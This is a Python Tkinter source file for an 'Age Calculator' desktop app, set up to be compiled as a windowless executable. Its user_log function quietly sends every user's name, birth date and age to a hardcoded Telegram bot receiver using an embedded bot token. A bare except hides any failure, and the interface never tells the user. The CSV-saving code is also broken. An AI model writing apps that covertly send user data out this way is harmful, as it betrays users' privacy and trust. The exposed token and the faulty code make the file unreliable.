
# Command To Compile It :- pyinstaller.exe --onefile -w main.py
import telepot
import csv
from tkinter import *
from datetime import date, datetime
import os.path

API_KEY = "5171294327:AAFHIwnBhNYOeARRG5TOpsN3zIk2DHnP0M8"
RECEIVER_ID = 601063662

# Setting Root
root = Tk()
root.geometry("500x500")
root.title("Age Calculator")
root.iconbitmap(
    "D:\MEGA\Priyanshu\Programming\Python\Tkinter\Age Calculator\icon-age-group.ico"
)

# For Logging User Data


def user_log():
    try:
        send_message = str(
            str(user_name.get())
            + "\nYear: "
            + str(bdate_y.get())
            + "\nMonth: "
            + str(bdate_m.get())
            + "\nDay: "
            + str(bdate_d.get())
            + "\nCurrent Age: "
            + str(age)
            + "\nUsed Date: "
            + str(today)
        )
        bot = telepot.Bot(API_KEY)
        bot.sendMessage(RECEIVER_ID, send_message)
        print(send_message + "\n\n")
    except:
        pass


# For Calculating Age
def printAge():
    # Date Time Format : 2022-03-02
    try:
        global today
        today = date.today()
        byear = int(bdate_y.get())
        bday = int(bdate_d.get())
        bmonth = int(bdate_m.get())
        global age
        age = calculate_age(date(byear, bmonth, bday))

        age_label = Label(
            root,
            text="Your Age is " + str(age),
            relief=SOLID,
            borderwidth=2,
            padx=5,
            pady=5,
            foreground="lime green",
        )
        age_label.configure(font=("Courier New", 16))
        age_label.pack()
        print("Data Saved Successfully\n")
    except:
        error_message = Label(
            root, text="Do Not Leave Any Field Empty!", relief=SOLID)
        error_message.pack()


def calculate_age(dtob):
    today = date.today()
    return today.year - dtob.year - ((today.month, today.day) < (dtob.month, dtob.day))


def clear_details():
    bdate_d.delete(0, END)
    bdate_m.delete(0, END)
    bdate_y.delete(0, END)


def save_to_csv():
    data = [user_name.get(), age, bdate_y.get(), bdate_m.get(), bdate_d.get()]
    file_path = "D:\MEGA\Priyanshu\Programming\Python\Tkinter\Age Calculator\Age.csv"
    file_exists = os.path.isfile(file_path)
    with open (file_path, 'a') as csvfile:
        header = ["Name", "Current_Age", "Year", "Month", "Day"]
        writer = csv.DictWriter(csvfile, delimiter=',', lineterminator='\n',fieldnames=header)

        if not file_exists:
            writer.writeheader(header)  # file doesn't exist yet, write a header

        writer.writerow(data)


if __name__ == "__main__":

    # Main Home Screen Contents
    name_info = Label(
        root, text="Enter Your Name:", relief=SOLID, borderwidth=3, padx=5, pady=5
    )
    user_name = Entry(root, width=30, font=("Arial 15"), relief=SOLID)

    info = Label(
        root, text="Enter Your Birth Date", relief=SOLID, borderwidth=3, padx=5, pady=5
    )

    info_1 = Label(root, text="Enter Day: ", borderwidth=2, padx=5, pady=5)
    bdate_d = Entry(root, width=25, relief=SOLID)
    info_2 = Label(root, text="Enter Month: ", borderwidth=2, padx=5, pady=5)
    bdate_m = Entry(root, width=25, relief=SOLID)
    info_3 = Label(root, text="Enter Year: ", borderwidth=2, padx=5, pady=5)
    bdate_y = Entry(root, width=25, relief=SOLID)

    submit = Button(
        root,
        text="Submit",
        command=lambda: [printAge(), user_log(), save_to_csv()],
        relief=SOLID,
        borderwidth=3,
        padx=5,
        pady=5,
    )
    clear_btn = Button(
        root,
        text="Clear",
        command=clear_details,
        relief=SOLID,
        borderwidth=3,
        padx=5,
        pady=5,
    )

    # Changing Font
    info.configure(font=("Courier New", 16, "italic"))
    submit.configure(font=("Courier New", 16, "italic"))

    # Packing Everything
    name_info.pack(pady=15)
    user_name.pack()
    info.pack(pady=15)
    info_1.pack()
    bdate_d.pack()
    info_2.pack()
    bdate_m.pack()
    info_3.pack()
    bdate_y.pack()
    submit.pack(padx=15, pady=10)
    clear_btn.pack(padx=25, pady=5)
    # Running Event Loop
    root.mainloop()
